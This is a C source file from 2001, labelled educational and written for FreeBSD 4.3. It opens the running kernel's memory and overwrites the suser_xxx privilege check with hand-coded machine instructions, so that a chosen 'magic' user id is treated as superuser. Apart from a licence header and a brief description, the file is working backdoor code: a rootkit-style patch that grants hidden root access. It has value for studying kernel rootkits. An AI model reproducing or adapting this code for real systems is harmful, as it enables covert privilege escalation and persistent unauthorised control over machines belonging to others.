/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    Patch suser_xxx in the running kernel in such a way, that a second
 *    user, namely the specified magic user, will also be considered a 
 *    'superuser'
 *
 *    This is written for educational purposes only. This was written
 *    for FreeBSD 4.3. If you're using a different FreeBSD version this
 *    is most likely not going to work. In fact, if you write this to the
 *    wrong place your machine will probably crash. Also note that this only
 *    deals with 8 bits uids ;) If you want more, you'll have to adapt the
 *    cmpl instruction (0x81...)
 *
 *    Writing things to the kernel of a running system is not exactly
 *    the safest thing to do. :)
 *
 *    $Id: fix_suser_xxx.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 */

#include <stdio.h>
#include <fcntl.h>
#include <kvm.h>
#include <nlist.h>
#include <limits.h>

/* 
    offset of the things we want to replaces starting at the 
    beginning of the function - this will most likely vary on
    a slightly different freebsd 
*/

#define MAGIC_OFFSET    0x11
#define MAKE_OR_OFFSET  0x31

unsigned char magic[] = "\xeb\x07"      /* jmp 06 */
                        "\x83\x78\x04\x00"      /* cmpl $magic,0x4(%eax) */
                        "\x74\x39"      /* je to end */
                        "\x90\x90"              /* filling nop */
;


unsigned char makeor[] = "\x75\xe0";    /* jne e0 */


int
main(int argc, char **argv) {

    char errbuf[_POSIX2_LINE_MAX];
    long diff; 
    kvm_t *kd;
    u_int magic_id;
    u_int32_t magic_addr;
    u_int32_t makeor_addr;
    struct nlist nl[] = { { NULL }, { NULL }, };

    if(!argv[1]) {
        fprintf(stderr,"Usage: fix_suser_xxx [magic uid]\n");
        exit(-1);
    }

    /* get the supplied magic user id */
    magic_id = atoi(argv[1]);
    if(magic_id > 0xff) {
        fprintf(stderr,"User ID to big\n");
        exit(-1);
    }

    kd = kvm_openfiles(NULL,NULL,NULL,O_RDWR,errbuf);
    if(kd == NULL) {
        fprintf(stderr,"ERROR: %s\n",errbuf);
        exit(-1);
    }

    /* find the address of suser_xxx */
    nl[0].n_name = "suser_xxx";

    if(kvm_nlist(kd,nl) < 0) {
        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
        exit(-1);
    }

    if(!nl[0].n_value) {
        fprintf(stderr,"Symbol %s not found.\n",nl[0].n_name);
        exit(-1);
    }

    printf("suser_xxx is at 0x%x\n",nl[0].n_value);

    /* calculate the right address from there */
    magic_addr = nl[0].n_value + MAGIC_OFFSET;
    makeor_addr = nl[0].n_value + MAKE_OR_OFFSET;

    /* put in the magic user id */
    magic[5] = magic_id;

    /* write out the first part, the magic user check */
    if(kvm_write(kd,magic_addr,magic,sizeof(magic)-1) < 0) {
        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
        exit(-1);
    }

    /* adapt the jump after checking user != 0 */
    if(kvm_write(kd,makeor_addr,makeor,sizeof(makeor)-1) < 0) {
        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
        exit(-1);
    }

    printf("wrote changes...\n");

    if(kvm_close(kd) < 0) {
        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
        exit(-1);
    }

    exit(0);
}
